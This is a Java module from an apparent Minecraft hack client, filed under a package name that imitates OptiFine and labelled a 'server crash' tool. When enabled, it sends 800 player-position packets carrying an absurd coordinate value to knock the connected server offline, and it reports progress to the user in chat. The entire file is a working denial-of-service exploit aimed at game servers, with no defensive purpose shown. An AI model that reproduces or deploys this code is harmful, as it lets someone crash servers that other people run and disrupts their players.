package net.optifine.Modules.world;

import net.optifine.Manager.ModuleManager;
import net.optifine.Modules.ModuleType;
import net.optifine.Modules.Module;
import net.optifine.Utils.utils.Helper;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;
import org.lwjgl.input.Keyboard;

public class FuckServer extends Module {
    public FuckServer() {
        super("FuckServer", Keyboard.KEY_NONE, ModuleType.World,"send packet make server shutdown");
        Chinese="崩服";
    }

    @Override
    public void enable(){
        ServerFucker Fucker = new ServerFucker();
        Fucker.start();
        Helper.sendMessage("Fucking, Please wait...");
        super.enable();
    }

    class ServerFucker extends Thread{
        @Override
        public void run(){
            int i = 0;
            while (i < 800) {
                Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301,-999.0,0.0,true));
                i = i + 1;
                try {
                    Thread.sleep(10);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            Helper.sendMessage("Server Crash Packet Send done.");
            ModuleManager.getModule("FuckServer").setState(false);
        }
    }
}
